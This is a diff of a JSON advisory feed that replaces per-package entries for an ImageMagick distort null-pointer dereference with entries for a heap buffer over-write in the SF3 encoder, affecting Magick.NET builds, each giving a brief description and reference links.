+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-OpenMP-x64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-OpenMP-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-OpenMP-x64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q8-AnyCPU] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-OpenMP-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-x86] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q8-AnyCPU] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-x64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-x86] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-x64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-OpenMP-x64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-OpenMP-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-OpenMP-x64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-HDRI-x86] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-OpenMP-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-HDRI-x64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-HDRI-x86] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-HDRI-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-HDRI-x64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
+            "content_html": "<p>An crafted multi-frame can result in a heap buffer over-write when encoding it with the SF3 encoder.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53465\">https://nvd.nist.gov/vuln/detail/CVE-2026-53465</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-44cp-c3ww-9rv5\">https://github.com/advisories/GHSA-44cp-c3ww-9rv5</a></li>\n</ul>\n",
+            "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5",
+            "title": "[Magick.NET-Q16-HDRI-OpenMP-arm64] ImageMagick has a Heap Buffer Over-Write in SF3 encoder when writing multi-frame image",
+            "date_modified": "2026-06-26T23:11:50.000Z",
+            "date_published": "2026-06-26T23:11:49.000Z",
             "author": {
                 "name": "GitHub",
-                "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6"
+                "url": "https://github.com/advisories/GHSA-44cp-c3ww-9rv5"
             },
             "tags": [
                 "severity"
             ]
         },
         {
-            "content_html": "<p>When passing incorrect arguments in the distort operation a null pointer deference will occur.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-53463\">https://nvd.nist.gov/vuln/detail/CVE-2026-53463</a></li>\n<li><a href=\"https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0\">https://github.com/dlemstra/Magick.NET/releases/tag/14.14.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9rq-q46c-g4x6\">https://github.com/advisories/GHSA-p9rq-q46c-g4x6</a></li>\n</ul>\n",
-            "url": "https://github.com/advisories/GHSA-p9rq-q46c-g4x6",
-            "title": "[Magick.NET-Q16-HDRI-arm64] ImageMagick has Null Pointer Dereference caused by the distort operation when passing incorrect arguments",
-            "date_modified": "2026-06-26T17:51:24.000Z",
-            "date_published": "2026-06-26T17:51:22.000Z",
